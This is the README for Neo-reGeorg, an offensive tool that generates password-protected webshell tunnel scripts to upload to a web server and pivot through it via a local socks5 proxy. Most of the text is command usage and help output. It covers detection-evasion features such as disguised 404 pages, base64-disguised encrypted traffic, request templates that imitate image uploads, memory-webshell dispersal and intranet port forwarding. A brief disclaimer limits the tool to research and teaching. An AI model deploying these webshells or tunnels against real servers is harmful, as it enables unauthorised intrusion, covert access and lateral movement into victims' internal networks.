# Neo-reGeorg

[简体中文](README.md)　｜　[English](README-en.md)

**Neo-reGeorg** is a project designed to actively restructure [reGeorg](https://github.com/sensepost/reGeorg) with the aim of:

* Improve usability and avoid feature detection
* Improve tunnel connection security
* Improve the confidentiality of transmission content
* Solve the existing problems of reGeorg and fix some small bugs

> This tool is limited to safety research and teaching, and the user assumes all legal and related responsibilities caused by the use of this tool! The author does not bear any legal and related responsibilities!

## Version

5.1.0 - [Change Log](CHANGELOG-en.md)


## Features

* The transmission content is encrypted by deformed base64 and disguised as base64 encoding
* Use BLV (Byte-LengthOffset-Value) data format to transmit data
* Direct request response can be customized (such as a disguised 404 page)
* HTTP Headers can be customized
* Support request template
* Custom HTTP response code
* Multiple URL random requests
* Server-side DNS resolution
* Compatible with python2 / python3
* High compatibility of the server environment, such as the server is unstable, the server is only deployed on some machines under load balancing and other special circumstances
* (php only) Refer to [pivotnacci](https://github.com/blackarrowsec/pivotnacci) to create multiple TCP connections for a single session, to deal with some load balancing scenarios
* aspx/ashx/jsp/jspx no longer depends on Session, and can run normally in harsh environments such as no cookies
* (non-php) supports intranet forwarding to deal with load balancing environment
* Support process to start the server to deal with more scenarios


## Basic Usage

* **Step 1.**
Set the password to generate tunnel server.(aspx|ashx|jsp|jspx|php) and upload it to the web server.
```ruby
$ python neoreg.py generate -k password

    [+] Create neoreg server files:
       => neoreg_servers/tunnel.jsp
       => neoreg_servers/tunnel.jspx
       => neoreg_servers/tunnel.ashx
       => neoreg_servers/tunnel.aspx
       => neoreg_servers/tunnel.php
       => neoreg_servers/tunnel.go
```

* **Step 2.**
Use `neoreg.py` to connect to the web server and create a socks5 proxy locally.
```ruby
$ python3 neoreg.py -k password -u http://xx/tunnel.php
+------------------------------------------------------------------------+
  Log Level set to [DEBUG]
  Starting socks server [127.0.0.1:1080]
  Tunnel at:
    http://xx/tunnel.php
+------------------------------------------------------------------------+
```


## Advanced Usage

1. Support the generated server, by default directly requesting and responding to the specified page content (such as a disguised 404 page)
```ruby
$ python neoreg.py generate -k <you_password> --file 404.html
$ python neoreg.py -k <you_password> -u <server_url> --skip
```

2. For example, the server WEB needs to set the proxy to access
```ruby
$ python neoreg.py -k <you_password> -u <server_url> --proxy socks5://10.1.1.1:8080
```

3. To set `Authorization`, there are also custom `Header` or `Cookie` content.
```ruby
$ python neoreg.py -k <you_password> -u <server_url> -H 'Authorization: cm9vdDppcyB0d2VsdmU=' --cookie "key=value;key2=value2"
```

4. Need to disperse requests, upload to multiple paths, such as memory-webshell
```ruby
$ python neoreg.py -k <you_password> -u <url_1> -u <url_2> -u <url_3> ...
```

5. Turn on http forwarding to cope with load balancing
```ruby
$ python neoreg.py -k <you_password> -u <url> -r <redirect_url>
```

6. Use the port forwarding function, do not start the socks5 service ( 127.0.0.1:1080 -> ip:port )
```ruby
$ python neoreg.py -k <you_password> -u <url> -t <ip:port>
```

7. Set the request content template (you need to specify it when generating)
```ruby
# The request content will be replaced with NEOREGBODY
$ python3 neoreg.py -k password -T 'img=data:image/png;base64,NEOREGBODY&save=ok'
$ python3 neoreg.py -k password -T 'img=data:image/png;base64,NEOREGBODY&save=ok' -u http://127.0.0.1:8000/anysting

# NOTE Allows template content to be written to a file -T file
```

8. Support the creation process to start a new Neoreg server-side, which can deal with harsh special environments
```ruby
$ go run neoreg_servers/tunnel.go 8000
$ python3 neoreg.py -k password -u http://127.0.0.1:8000/anysting
```

* For more information on performance and stability parameters, refer to -h help information
```ruby
# Generate server-side scripts
$ python neoreg.py generate -h
    usage: neoreg.py [-h] -k KEY [-o DIR] [-f FILE] [-c CODE] [--read-buff Bytes]
                     [--max-read-size KB]

    Generate neoreg webshell

    optional arguments:
      -h, --help            show this help message and exit
      -k KEY, --key KEY     Specify connection key.
      -o DIR, --outdir DIR  Output directory.
      -f FILE, --file FILE  Camouflage html page file
      -c CODE, --httpcode CODE
                            Specify HTTP response code. When using -r, it is
                            recommended to <400 (default: 200)
      -T STR/FILE, --request-template STR/FILE
                            HTTP request template (eg:
                            'img=data:image/png;base64,NEOREGBODY&save=ok')
      --read-buff Bytes     Remote read buffer (default: 513)
      --max-read-size KB    Remote max read size (default: 512)

# Connection server
    usage: neoreg.py [-h] -u URI [-r URL] [-R] [-t IP:PORT] -k KEY [-l IP]
                     [-p PORT] [-s] [-H LINE] [-c LINE] [-x LINE]
                     [--php] [--php-connect-timeout S] [--local-dns] [--read-buff KB]
                     [--read-interval MS] [--write-interval MS] [--max-threads N]
                     [--max-retry N] [--cut-left N] [--cut-right N]
                     [--extract EXPR] [-v]

    Socks server for Neoreg HTTP(s) tunneller (DEBUG MODE: -k debug)

    optional arguments:
      -h, --help            show this help message and exit
      -u URI, --url URI     The url containing the tunnel script
      -r URL, --redirect-url URL
                            Intranet forwarding the designated server (only
                            java/.net)
      -R, --force-redirect  Forced forwarding (only -r)
      -t IP:PORT, --target IP:PORT
                            Network forwarding Target, After setting this
                            parameter, port forwarding will be enabled
      -k KEY, --key KEY     Specify connection key
      -l IP, --listen-on IP
                            The default listening address (default: 127.0.0.1)
      -p PORT, --listen-port PORT
                            The default listening port (default: 1080)
      -s, --skip            Skip usability testing
      -H LINE, --header LINE
                            Pass custom header LINE to server
      -c LINE, --cookie LINE
                            Custom init cookies
      -x LINE, --proxy LINE
                            Proto://host[:port] Use proxy on given port
      -T STR/FILE, --request-template STR/FILE
                            HTTP request template (eg:
                            'img=data:image/png;base64,NEOREGBODY&save=ok')
      --php                 Use php connection method
      --php-connect-timeout S
                            PHP connect timeout (default: 0.5)
      --local-dns           Use local resolution DNS
      --read-buff KB        Local read buffer, max data to be sent per POST
                            (default: 7, max: 50)
      --read-interval MS    Read data interval in milliseconds (default: 300)
      --write-interval MS   Write data interval in milliseconds (default: 200)
      --max-threads N       Proxy max threads (default: 400)
      --max-retry N         Proxy max threads (default: 10)
      --cut-left N          Truncate the left side of the response body
      --cut-right N         Truncate the right side of the response body
      --extract EXPR        Manually extract BODY content (eg:
                            <html><p>NEOREGBODY</p></html> )
      -v                    Increase verbosity level (use -vv or more for greater
                            effect)
```


## Remind

* When running `neoreg.py` with high concurrency on Mac OSX, a large number of network requests will be lost. You can use `ulimit -n 2560` to modify the "maximum number of open files" of the current shell.


## License

GPL 3.0


## Star History Chart

[![Star History Chart](https://api.star-history.com/svg?repos=L-codes/Neo-reGeorg&type=Date)](https://star-history.com/#L-codes/Neo-reGeorg&Date)

<img align='right' src="https://profile-counter.glitch.me/neo-regeorg/count.svg" width="200">
